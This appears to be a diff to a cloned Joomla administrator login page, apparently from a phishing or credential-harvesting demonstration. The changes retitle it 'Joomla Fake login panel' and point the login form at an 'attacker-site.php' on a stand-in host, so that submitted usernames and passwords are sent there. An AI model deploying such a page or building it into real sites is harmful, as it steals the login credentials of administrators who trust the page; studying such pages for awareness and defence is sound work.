@@ -5,7 +5,7 @@
 	<meta http-equiv="X-UA-Compatible" content="IE=edge" />
 		<meta charset="utf-8" />
 	<meta name="generator" content="Joomla! - Open Source Content Management" />
-	<title>Joomla Test - Amministrazione</title>
+	<title>Joomla Fake login panel</title>
 	<link href="/web-applications/joomla/administrator/templates/isis/favicon.ico" rel="shortcut icon" type="image/vnd.microsoft.icon" />
 	<link href="/web-applications/joomla/media/jui/css/chosen.css" rel="stylesheet" />
 	<link href="/web-applications/joomla/administrator/templates/isis/css/template.css?630f6006427198bfcc5240970b66f2ac" rel="stylesheet" />
@@ -8908,7 +8908,7 @@ jQuery(function($){ $(".hasTooltip").tooltip({"html": true,"container": "body"})
 				<div id="system-message-container">
 	</div>
 
-				<form action="http://localhost/security/attacker-site.php?username=username&passwd=password" method="get" id="form-login" class="form-inline">
+				<form action="http://yourhost/test/attacker-site.php?username=username&passwd=password" method="get" id="form-login" class="form-inline">
 	<fieldset class="loginform">
 		<div class="control-group">
 			<div class="controls">
